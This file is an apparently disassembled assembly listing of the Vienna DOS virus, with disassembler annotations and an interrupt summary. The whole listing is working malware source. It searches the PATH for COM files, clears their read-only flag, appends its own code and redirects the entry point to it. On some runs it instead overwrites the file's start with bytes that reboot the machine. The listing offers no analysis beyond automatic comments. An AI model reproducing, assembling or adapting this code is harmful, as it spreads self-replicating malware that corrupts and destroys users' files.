


PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        VIENNA				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   8-Nov-90					         ÛÛ
;ÛÛ      Version:						         ÛÛ
;ÛÛ      Passes:    9	       Analysis Options on: QRS		         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e		equ	0			; (0000:0000=8Fh)
data_2e		equ	0			; (77C7:0000=0)
data_3e		equ	0Ah			; (77C7:000A=0)
data_4e		equ	1Fh			; (77C7:001F=0)
data_5e		equ	2Ch			; (77C7:002C=0)
data_6e		equ	5Fh			; (77C7:005F=0)
data_7e		equ	8Ah			; (77C7:008A=0)

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

vienna		proc	far

start:
		jmp	loc_1			; (0500)
		db	1011 dup (90h)
		db	0B4h, 4Ch,0A0h,0FEh, 04h,0CDh
		db	 21h, 00h, 00h, 00h
loc_1:						;  xref 77C7:0100
		push	cx
		mov	dx,6F9h
		cld				; Clear direction
		mov	si,dx
		add	si,0Ah
		nop
		mov	di,offset ds:[100h]	; (77C7:0100=0E9h)
		mov	cx,3
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	si,dx
		mov	ah,30h			; '0'
		int	21h			; DOS Services  ah=function 30h
						;  get DOS version number ax
		cmp	al,0
		jne	loc_2			; Jump if not equal
		jmp	loc_20			; (06E7)
loc_2:						;  xref 77C7:051B
		push	es
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		mov	[si],bx
		nop
		nop
		mov	[si+2],es
		nop
		pop	es
		mov	dx,data_6e		; (77C7:005F=0)
		nop
		add	dx,si
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		push	es
		push	si
		mov	es,ds:data_5e		; (77C7:002C=0)
		mov	di,data_1e		; (0000:0000=8Fh)
loc_3:						;  xref 77C7:0552
		pop	si
		push	si
		add	si,1Ah
		nop
		lodsb				; String [si] to al
		mov	cx,8000h
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		mov	cx,4

locloop_4:					;  xref 77C7:0554
		lodsb				; String [si] to al
		scasb				; Scan es:[di] for al
		jnz	loc_3			; Jump if not zero
		loop	locloop_4		; Loop if cx > 0

		pop	si
		pop	es
		mov	[si+16h],di
		nop
		mov	di,si
		add	di,1Fh
		nop
		mov	bx,si
		add	si,1Fh
		nop
		mov	di,si
		jmp	short loc_10		; (05A5)
loc_5:						;  xref 77C7:05CB
		cmp	word ptr [si+16h],0
		nop
		nop
		jnz	loc_6			; Jump if not zero
		jmp	loc_19			; (06D9)
loc_6:						;  xref 77C7:0572
		push	ds
		push	si
		mov	ds,es:data_5e		; (77C7:002C=0)
		mov	di,si
		mov	si,es:[di+16h]
		nop
		add	di,1Fh
loc_7:						;  xref 77C7:0592
		lodsb				; String [si] to al
		cmp	al,3Bh			; ';'
		je	loc_9			; Jump if equal
		cmp	al,0
		je	loc_8			; Jump if equal
		stosb				; Store al to es:[di]
		jmp	short loc_7		; (0588)
loc_8:						;  xref 77C7:058F
		mov	si,data_2e		; (77C7:0000=0)
loc_9:						;  xref 77C7:058B
		pop	bx
		pop	ds
		mov	[bx+16h],si
		nop
		cmp	ch,0FFh
		je	loc_10			; Jump if equal
		mov	al,5Ch			; '\'
		stosb				; Store al to es:[di]
loc_10:						;  xref 77C7:056A, 05A0
		mov	[bx+18h],di
		nop
		mov	si,bx
		add	si,10h
		mov	cx,6
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	si,bx
		mov	ah,4Eh			; 'N'
		mov	dx,data_4e		; (77C7:001F=0)
		nop
		add	dx,si
		mov	cx,3
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jmp	short loc_12		; (05C9)
		db	90h
loc_11:						;  xref 77C7:05D5, 05DD, 05E5
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
loc_12:						;  xref 77C7:05C2
		jnc	loc_13			; Jump if carry=0
		jmp	short loc_5		; (056C)
loc_13:						;  xref 77C7:05C9
		mov	ax,[si+75h]
		nop
		and	al,1Fh
		cmp	al,1Fh
		je	loc_11			; Jump if equal
		cmp	word ptr [si+79h],0FA00h
		nop
		ja	loc_11			; Jump if above
		cmp	word ptr [si+79h],0Ah
		nop
		nop
		jc	loc_11			; Jump if carry Set
		mov	di,[si+18h]
		nop
		push	si
		add	si,7Dh
		nop
loc_14:						;  xref 77C7:05F4
		lodsb				; String [si] to al
		stosb				; Store al to es:[di]
		cmp	al,0
		jne	loc_14			; Jump if not equal
		pop	si
		mov	ax,4300h
		mov	dx,data_4e		; (77C7:001F=0)
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		mov	[si+8],cx
		nop
		mov	ax,4301h
		and	cx,0FFFEh
		nop
		mov	dx,data_4e		; (77C7:001F=0)
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		mov	ax,3D02h
		mov	dx,data_4e		; (77C7:001F=0)
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jnc	loc_15			; Jump if carry=0
		jmp	loc_18			; (06CA)
loc_15:						;  xref 77C7:0620
		mov	bx,ax
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	[si+4],cx
		nop
		mov	[si+6],dx
		nop
		mov	ah,2Ch			; ','
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dh=sec
		and	dh,7
		jnz	loc_16			; Jump if not zero
		mov	ah,40h			; '@'
		mov	cx,5
		mov	dx,si
		add	dx,data_7e		; (77C7:008A=0)
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		jmp	short loc_17		; (06B1)
		db	90h
loc_16:						;  xref 77C7:063B
		mov	ah,3Fh			; '?'
		mov	cx,3
		mov	dx,data_3e		; (77C7:000A=0)
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		jc	loc_17			; Jump if carry Set
		cmp	ax,3
		jne	loc_17			; Jump if not equal
		mov	ax,4202h
		mov	cx,0
		mov	dx,0
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		jc	loc_17			; Jump if carry Set
		mov	cx,ax
		sub	ax,3
		mov	[si+0Eh],ax
		nop
		add	cx,2F9h
		mov	di,si
		sub	di,1F7h
		mov	[di],cx
		mov	ah,40h			; '@'
		mov	cx,288h
		mov	dx,si
		sub	dx,1F9h
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		jc	loc_17			; Jump if carry Set
		cmp	ax,288h
		jne	loc_17			; Jump if not equal
		mov	ax,4200h
		mov	cx,0
		mov	dx,0
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		jc	loc_17			; Jump if carry Set
		mov	ah,40h			; '@'
		mov	cx,3
		mov	dx,si
		add	dx,0Dh
		nop
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
loc_17:						;  xref 77C7:064A, 065A, 065F, 066C
						;            0690, 0695, 06A2
		mov	dx,[si+6]
		nop
		mov	cx,[si+4]
		nop
		and	cx,0FFE0h
		nop
		or	cx,1Fh
		nop
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
loc_18:						;  xref 77C7:0622
		mov	ax,4301h
		mov	cx,[si+8]
		nop
		mov	dx,data_4e		; (77C7:001F=0)
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
loc_19:						;  xref 77C7:0574
		push	ds
		mov	ah,1Ah
		mov	dx,[si]
		nop
		nop
		mov	ds,[si+2]
		nop
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		pop	ds
loc_20:						;  xref 77C7:051D
		pop	cx
		xor	ax,ax			; Zero register
		xor	bx,bx			; Zero register
		xor	dx,dx			; Zero register
		xor	si,si			; Zero register
		mov	di,100h
		push	di
		xor	di,di			; Zero register
		retn	0FFFFh
		add	byte ptr [bx+si],0C7h
		ja	$+70h			; Jump if above
		sub	byte ptr [bx+si+15h],20h	; ' '
		add	cl,ch
		db	0F3h, 03h,0E9h,0FDh, 03h, 2Ah
		db	 2Eh, 43h, 4Fh, 4Dh, 00h, 1Ch
		db	 00h, 18h, 07h
		db	'PATH=SWILL.COM'


		db	 00h, 4Fh, 4Dh
		db	52 dup (0)
		db	 01h, 3Fh
		db	7 dup (3Fh)
		db	 43h, 4Fh, 4Dh, 03h, 08h, 00h
		db	 00h, 00h, 2Eh, 8Bh, 26h, 68h
		db	 20h, 6Eh, 80h, 68h, 15h, 00h
		db	 04h, 00h, 00h
		db	'SWILL.COM'

		db	 00h, 4Fh, 4Dh, 00h
		db	 20h, 20h, 20h, 20h, 20h

vienna		endp

seg_a		ends



		end	start

±±±±±±±±±±±±±±±±±±±± CROSS REFERENCE - KEY ENTRY POINTS ±±±±±±±±±±±±±±±±±±±

    seg:off    type	   label
   ---- ----   ----   ---------------
   77C7:0100   far    start

 ±±±±±±±±±±±±±±±±±± Interrupt Usage Synopsis ±±±±±±±±±±±±±±±±±±

        Interrupt 21h :	 set DTA to ds:dx
        Interrupt 21h :	 get time, cx=hrs/min, dh=sec
        Interrupt 21h :	 get DTA ptr into es:bx
        Interrupt 21h :	 get DOS version number ax
        Interrupt 21h :	 open file, al=mode,name@ds:dx
        Interrupt 21h :	 close file, bx=file handle
        Interrupt 21h :	 read file, cx=bytes, to ds:dx
        Interrupt 21h :	 write file cx=bytes, to ds:dx
        Interrupt 21h :	 move file ptr, cx,dx=offset
        Interrupt 21h :	 get/set file attrb, nam@ds:dx
        Interrupt 21h :	 find 1st filenam match @ds:dx
        Interrupt 21h :	 find next filename match
        Interrupt 21h :	 get/set file date & time

 ±±±±±±±±±±±±±±±±±± I/O	Port Usage Synopsis  ±±±±±±±±±±±±±±±±±±

        No I/O ports used.


